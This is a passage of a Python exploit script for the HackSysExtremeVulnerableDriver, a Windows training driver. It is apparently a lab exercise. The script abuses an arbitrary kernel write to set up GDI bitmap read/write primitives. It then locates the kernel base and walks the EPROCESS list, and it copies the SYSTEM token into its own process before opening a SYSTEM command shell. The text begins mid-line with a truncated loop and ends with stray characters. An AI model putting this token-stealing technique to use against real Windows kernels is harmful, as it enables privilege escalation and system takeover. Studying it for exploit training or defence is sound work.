        pHMValidateHandle_offset = 0
        while(offset 
        system_information = create_string_buffer(system_information.raw[8:])
        for x in range(module_count.value):
            smi = SYSTEM_MODULE_INFORMATION()
            temp_system_information = create_string_buffer(system_information.raw[sizeof(smi) * x: sizeof(smi) * (x+1)])
            ctypes.memmove(addressof(smi), temp_system_information, sizeof(smi))
            module_name =  smi.FullPathName.split('\')[-1]
            modules[module_name] = smi
        #debug_print ("rn[+] NtQuerySystemInformation():")
        # Get base addresses and return them in a list
        base_addresses = []
        for input_module in input_modules:
            try:
                base_address = modules[input_module].ImageBase
                #debug_print ("t[-] %s base address: 0x%X" % (input_module, base_address))
                base_addresses.append(base_address)
            except:
                base_addresses.append(0)
        return base_addresses
    def main():
        global hManager
        global hWorker
        hevDevice = kernel32.CreateFileA("\\.\HackSysExtremeVulnerableDriver",0xc0000000,0,None,0x3,0,None)
        if not hevDevice or hevDevice == -1:
            print "[-] Couldn't get Device Driver handle."
            sys.exit(0)
        findHMValidateHandle()
        debug_print ("[>] Setting up Manager Bitmap:")
        debug_print ("t[+] Allocating and Freeing Windows")
        dup_address = alloc_free_windows()
        dwReturn = c_void_p()
        gdi32.CreateBitmap.restype = HBITMAP
        hManager = gdi32.CreateBitmap(0x100, 0x6D, 1, 0x1, dwReturn) # Win10x64RS2 size = 0x1020
        debug_print ("t[+] Manager Bitmap handle: 0x%X" % hManager)
        hManager_pvscan0_off = dup_address + 0x50
        debug_print ("t[+] Manager bitmap pvscan0 offset: 0x%X" % hManager_pvscan0_off)
        debug_print ("[>] Setting up Worker Bitmap:")
        debug_print ("t[+] Allocating and Freeing Windows")
        dup_address = alloc_free_windows()
        dwReturn = c_void_p()
        gdi32.CreateBitmap.restype = HBITMAP
        hWorker = gdi32.CreateBitmap(0x100, 0x6D, 1, 0x1, dwReturn) # size = 0x1020
        debug_print ("t[+] Worker Bitmap handle: 0x%X" % hWorker)
        hWorker_pvscan0_off = dup_address + 0x50
        debug_print ("t[+] Worker bitmap pvscan0 offset: 0x%X" % hWorker_pvscan0_off)
        write_where = struct.pack("<Q", hManager_pvscan0_off)
        write_what_object = struct.pack("<Q", hWorker_pvscan0_off)
        write_what_object_ptr = id(write_what_object) + 0x20
        write_what_final = struct.pack("<Q", write_what_object_ptr)
        buf = write_what_final + write_where
        buflen = len(buf)
        kernel32.DeviceIoControl(hevDevice,0x22200B,buf,buflen,None,0,byref(c_ulong()),None)
        kernelImage = "ntoskrnl.exe"
        kernelImageBase = find_kernelBase(kernelImage.split())[0]
        kernel32.LoadLibraryA.restype = HMODULE
        hKernelImage = kernel32.LoadLibraryA(kernelImage)
        print "[+] Module Name                                  : {0}".format(kernelImage)
        print "[+] Module Base(Userland)                        : {0}".format(hex(hKernelImage))
        kernel32.GetProcAddress.restype = c_ulonglong
        kernel32.GetProcAddress.argtypes = (HMODULE, LPCSTR)
        PsISP_user_addr = kernel32.GetProcAddress(hKernelImage,"PsInitialSystemProcess")
        print "[+] PsInitialSystemProcess Userland Base Address : {0}".format(hex(PsISP_user_addr))
        PsISP_kernel_addr_ptr = kernelImageBase + (PsISP_user_addr - hKernelImage)
        print "[+] PsInitialSystemProcess Kernel Base Address   : {0}".format(hex(PsISP_kernel_addr_ptr))
        PsISP_kernel_addr = c_ulonglong()
        read_mem(PsISP_kernel_addr_ptr, byref(PsISP_kernel_addr), sizeof(PsISP_kernel_addr));
        SYSTEM_EPROCESS = PsISP_kernel_addr.value
        print "[+] SYSTEM EPROCESS                              : {0}".format(hex(SYSTEM_EPROCESS))
        token_off = 0x358
        unique_process_id_off = 0x2e0
        active_process_links_off = 0x2e8
        flink = c_ulonglong()
        read_mem(SYSTEM_EPROCESS + active_process_links_off, byref(flink), sizeof(flink)); 
        CURRENT_EPROCESS = 0
        while (True):
            unique_process_id = c_ulonglong(0)
            # Adjust EPROCESS pointer for next entry
            EPROCESS = flink.value - unique_process_id_off - 0x8
            read_mem(EPROCESS + unique_process_id_off, byref(unique_process_id), sizeof(unique_process_id));    
            # Check if we're in the current process
            if (os.getpid() == unique_process_id.value):
                CURRENT_EPROCESS = EPROCESS
                break
            read_mem(EPROCESS + active_process_links_off, byref(flink), sizeof(flink)); 
            # If next same as last, we've reached the end
            if (EPROCESS == flink.value - unique_process_id_off - 0x8):
                break
        print "[+] CURRENT EPROCESS                             : {0}".format(hex(CURRENT_EPROCESS))
        system_token = c_ulonglong()
        read_mem(SYSTEM_EPROCESS + token_off, byref(system_token), sizeof(system_token));
        write_mem(CURRENT_EPROCESS + token_off, byref(system_token), sizeof(system_token));
        Popen("start cmd", shell=True)
    if __name__ == "__main__":
        main()
WIN~